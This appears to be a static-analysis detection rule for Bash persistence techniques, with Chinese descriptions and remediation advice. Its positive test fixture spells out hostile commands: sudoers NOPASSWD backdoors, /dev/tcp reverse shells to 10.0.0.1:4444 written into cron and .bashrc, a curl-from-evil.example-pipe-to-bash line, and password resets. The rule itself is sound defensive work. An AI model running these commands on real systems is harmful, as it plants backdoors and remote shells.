desc(
	mode: "ssa"
	language: "bash"
	title: "Bash: persistence via shell startup, cron, systemd or sudoers"
	title_zh: "Bash：写入启动项、定时任务或 sudoers 持久化"
	type: vuln
	level: "high"
	rule_id: "bash-persistence"
	risk: "command-execution"
	desc: <<<DESC
### 说明
命令修改系统持久化位置：`~/.bashrc`、`~/.bash_profile`、`/etc/profile.d`、
`/etc/cron*`、`/var/spool/cron`、`/etc/systemd/system`、`/etc/init.d`、
`/etc/rc.local`、`/etc/update-motd.d`、`/etc/network/if-up.d`、
`/etc/sudoers(.d)`。`passwd --stdin`、`chpasswd` 与从 `/tmp` 加载的
systemd 服务同样常见于攻击者建立持久化。
DESC
	solution: <<<SOLUTION
### 修复建议
监控上述目录的写入，限制普通用户修改系统启动项和定时任务；排查新增的
cron、systemd unit、sudoers 条目和账户口令变更。
SOLUTION
	reference: <<<REFERENCE
[CWE-284](https://cwe.mitre.org/data/definitions/284.html)
REFERENCE
	alert_min: 1
	"file://pos.sh": <<<POS
echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
echo 'attacker ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/attacker
echo "* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> /var/spool/cron/root
echo 'curl -fsSL https://evil.example/x.sh | bash' >> /etc/profile.d/update.sh
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> ~/.bashrc
systemctl enable /tmp/evil.service
echo "linuxpassword" | passwd --stdin john
echo "john:P@ssw0rd" | chpasswd
POS
	"safefile://neg.sh": <<<NEG
systemctl status nginx
crontab -l
cat /etc/hosts
echo "hello" > /tmp/note
useradd -m deploy
NEG
)

*?{any: /\/etc\/sudoers(\.d\/|$)/} as $sudoersHit

*?{any: /\/var\/spool\/cron\//, /\/etc\/cron(\.d\/|\/|$)/, /\/etc\/crontab$/} as $cronFileHit

*?{any: /(^|\/)\.bashrc$/, /\.bash_profile$/, /\.bash_login$/, /\.profile$/, /\/etc\/profile(\.d\/|\/|$)/, /\/etc\/bash\.bashrc$/} as $shellRcHit

*?{any: /\/etc\/systemd\/system\//, /\/lib\/systemd\/system\//, /\/etc\/init\.d\//, /\/etc\/rc\.local$/} as $systemdFileHit

*?{any: /\/etc\/update-motd\.d\//, /\/etc\/network\/if-up\.d\//, /\/etc\/network\/if-down\.d\//} as $bootHookHit

passwd(* as $passwdArgs) as $passwdCall
$passwdCall?{have: /--stdin/} as $passwdHit

chpasswd(* as $chpasswdArgs) as $chpasswdHit

systemctl(* as $systemctlArgs) as $systemctlCall
$systemctlCall?{any: /enable/, /start/} as $systemctlEnable
$systemctlEnable?{any: /\/tmp\//, /\/dev\/shm\//, /\/var\/tmp\//} as $systemctlTmpHit

alert $sudoersHit for {
	level: "high",
	title: "Bash: persistence via shell startup, cron, systemd or sudoers",
	title_zh: "Bash：写入启动项、定时任务或 sudoers 持久化",
	message: "检测到 sudoers 配置写入，可能用于持久化提权。",
	risk: "access-control",
}

alert $cronFileHit for {
	level: "high",
	title: "Bash: persistence via shell startup, cron, systemd or sudoers",
	title_zh: "Bash：写入启动项、定时任务或 sudoers 持久化",
	message: "检测到系统 cron 文件访问，可能安装定时任务。",
	risk: "command-execution",
}

alert $shellRcHit for {
	level: "high",
	title: "Bash: persistence via shell startup, cron, systemd or sudoers",
	title_zh: "Bash：写入启动项、定时任务或 sudoers 持久化",
	message: "检测到 shell 启动脚本访问，可能写入持久化命令。",
	risk: "command-execution",
}

alert $systemdFileHit for {
	level: "high",
	title: "Bash: persistence via shell startup, cron, systemd or sudoers",
	title_zh: "Bash：写入启动项、定时任务或 sudoers 持久化",
	message: "检测到 systemd/init 启动项访问，可能注册自启动服务。",
	risk: "command-execution",
}

alert $bootHookHit for {
	level: "high",
	title: "Bash: persistence via shell startup, cron, systemd or sudoers",
	title_zh: "Bash：写入启动项、定时任务或 sudoers 持久化",
	message: "检测到开机/网络事件钩子访问，可能写入持久化命令。",
	risk: "command-execution",
}

alert $passwdHit for {
	level: "high",
	title: "Bash: persistence via shell startup, cron, systemd or sudoers",
	title_zh: "Bash：写入启动项、定时任务或 sudoers 持久化",
	message: "检测到 passwd --stdin 批量修改账户口令。",
	risk: "access-control",
}

alert $chpasswdHit for {
	level: "high",
	title: "Bash: persistence via shell startup, cron, systemd or sudoers",
	title_zh: "Bash：写入启动项、定时任务或 sudoers 持久化",
	message: "检测到 chpasswd 批量修改账户口令。",
	risk: "access-control",
}

alert $systemctlTmpHit for {
	level: "high",
	title: "Bash: persistence via shell startup, cron, systemd or sudoers",
	title_zh: "Bash：写入启动项、定时任务或 sudoers 持久化",
	message: "检测到从临时目录加载 systemd 服务。",
	risk: "command-execution",
}